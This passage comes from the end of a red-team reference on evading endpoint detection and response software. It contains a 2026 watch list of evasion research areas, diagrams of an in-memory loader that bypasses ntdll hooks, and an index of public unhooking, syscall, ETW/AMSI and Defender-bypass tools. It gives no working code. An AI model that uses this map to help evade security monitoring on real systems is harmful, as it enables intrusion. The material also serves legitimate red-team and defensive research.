- Effectiveness depends on target system configuration

---

## 5.5 Enhance Protection (Blue Team Reference)

- Prevent LSASS dumping by running it as a protected process light (`RunAsPPL`)
- Deeper analysis on EDR telemetry
- Heavy monitoring on common external compromise vectors
- Application Allow Listing

---

## 5.6 2026 Additions & Watch List

Scaffold for new techniques discovered during 2026 engagements.

### Suggested Categories to Track

- **CET/Shadow Stack bypass techniques** as CET becomes default, bypass research accelerates
- **ETW-TI re-hooking race conditions** Defender 1.417+ re-hooks within 50ms; timing attacks may yield windows
- **VBS Enclave weaponization** as signing requirements evolve, watch for leaked/compromised Azure Trusted Signing certs
- **AI-in-EDR adversarial ML** SentinelOne Static AI, CrowdStrike ML engine as adversarial ML targets
- **Windows 12 / 26H2 security boundary changes** new attack surface with new OS release
- **eBPF bypass innovations on Linux** kernel runtime verification of eBPF programs may introduce new attack patterns
- **EDR-as-attack-surface** continued research on ALPC/namespace/driver interfaces

### Template for New Entries

```markdown
### <technique name>

**Maturity:** STABLE / EMERGING / EXPERIMENTAL
**Targets:** <EDR vendor / OS version>
**Prerequisites:**
- 
**Technique:**
- 
**Detection surface:**
- 
**References:**
- 
```

---

# Appendix A. Diagrams

### EDR Detection & Prevention Mechanisms

```mermaid
flowchart TB
    EDR["Endpoint Detection & Response"]

    subgraph "Detection Mechanisms"
        UserHooks["User-Mode API Hooks"]
        KernelHooks["Kernel Callbacks"]
        ETW["Event Tracing for Windows"]
        PE["PE File Scanning"]
        Behavior["Behavioral Analysis"]
        Memory["Memory Scanning"]
    end

    subgraph "Protected Resources"
        AMSI["Anti-Malware Scan Interface"]
        ETW2["ETW Providers"]
        WinAPI["Windows APIs"]
        KernelObj["Kernel Objects"]
        ProcMem["Process Memory"]
    end

    EDR --> UserHooks
    EDR --> KernelHooks
    EDR --> ETW
    EDR --> PE
    EDR --> Behavior
    EDR --> Memory

    UserHooks --> WinAPI
    KernelHooks --> KernelObj
    ETW --> ETW2
    PE --> AMSI
    Memory --> ProcMem
```

### EDR Evasion Techniques

```mermaid
flowchart LR
    Attacker["Attacker"]

    subgraph "Evasion Categories"
        HookBypass["Hook Bypasses"]
        DirectSyscalls["Direct Syscalls"]
        IndirectJumps["Indirect Code Execution"]
        UnhookingTech["Unhooking Techniques"]
        SignatureEvade["Signature Evasion"]
    end

    subgraph "Common Techniques"
        NTDLL["NTDLL.DLL Techniques"]
        ProcInject["Process Injection"]
        MemModules["Memory-Only Modules"]
        AltExecution["Alternative Execution"]
    end

    Attacker --> HookBypass
    Attacker --> DirectSyscalls
    Attacker --> IndirectJumps
    Attacker --> UnhookingTech
    Attacker --> SignatureEvade

    HookBypass --> NTDLL
    DirectSyscalls --> NTDLL
    IndirectJumps --> ProcInject
    IndirectJumps --> MemModules
    IndirectJumps --> AltExecution
    UnhookingTech --> NTDLL
    SignatureEvade --> MemModules
```

### Modern EDR Evasion Workflow

```mermaid
sequenceDiagram
    participant A as Attacker
    participant L as Loader
    participant N as ntdll.dll
    participant S as Syscall Gateway
    participant K as Kernel

    A->>L: Deliver Encrypted Payload
    L->>L: Decrypt In-Memory
    L->>N: Check for Hooks

    alt Hooked APIs
        L->>N: Map Clean Copy of ntdll.dll
        L->>N: Use Syscall IDs Dynamically
    else No Hooks
        L->>N: Direct API Calls
    end

    L->>S: Execute Syscall
    S->>K: Transition to Kernel
    K->>K: Execute Operation
    K->>S: Return to User Mode
    S->>L: Continue Execution
```

---

# Appendix B. Tool & Resource Index

### Hook Evasion
- [unhook BOF](https://github.com/rsmudge/unhook-bof) module refreshing
- [Unhookme](https://github.com/mgeeky/UnhookMe) dynamic unhooking
- [FreshyCalls](https://github.com/crummie5/FreshyCalls) SSN resolution
- [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) syscall resolution
- [SysWhispers3](https://github.com/klezVirus/SysWhispers3) x86/Wow64 support
- [Runtime Function Table](https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/) SSN computation

### Sleep Obfuscation
- [Ekko](https://github.com/Cracked5pider/Ekko)
- [FOLIAGE](https://github.com/y11en/FOLIAGE)

### ETW / AMSI
- [SharpBlock](https://github.com/CCob/SharpBlock) patchless ETW/AMSI

### Callstack
- ThreadStackSpoofer, CallStackSpoofer, AceLdr, CallStackMasker, Unwinder, TitanLdr
- [uwd](https://github.com/joaoviictorti/uwd) Rust call stack spoofing

### Process Execution
- [TangledWinExec](https://github.com/daem0nc0re/TangledWinExec)
- [rad9800 WorkItemLoadLibrary](https://github.com/rad9800/misc/blob/main/bypasses/WorkItemLoadLibrary.c)

### String Obfuscation
- [Garble](https://github.com/burrowers/garble) Go
- [obfstr](https://github.com/CasualX/obfstr) Rust
- [NimProtect](https://github.com/itaymigdal/NimProtect) Nim

### Defender Bypass
- [DefenderBypass](https://github.com/hackmosphere/DefenderBypass) progressive bypass tools
- [defendnot](https://github.com/es3n1n/defendnot) WSC API abuse
- [DripLoader](https://github.com/xuanxuan0/DripLoader) chunked shellcode loading

### BYOVD / Kernel
- See **`byovd-drtm-xdr.md`** for complete driver catalog and tooling

### General Offensive
- [Certify](https://github.com/GhostPack/Certify) AD CS abuse
- [SharpHound](https://github.com/BloodHoundAD/SharpHound) AD enumeration

### References
- [Hang Fire Challenging Mental Model of Initial Access](https://medium.com/@matterpreter/hang-fire-challenging-our-mental-model-of-initial-access-513c71878767)
- [Macroless Phishing (video)](https://www.youtube.com/watch?v=WlR01tEgi_8)
- [Bypassing Access Mask Auditing](https://jsecurity101.medium.com/bypassing-access-mask-auditing-strategies-480fb641c158)
- [SID Strings documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings)

---

# Change Log

- **2026-04 (restructure):** Reorganized from flat narrative to 5-tier structure (Fundamentals → Evasion Arsenal → Platform-Specific → Infrastructure Attacks → Strategy & Tooling). All original content preserved. Added maturity tags, 2026 watch list, tool index appendix, cross-references to `byovd-drtm-xdr.md` and `initial-access.md`.

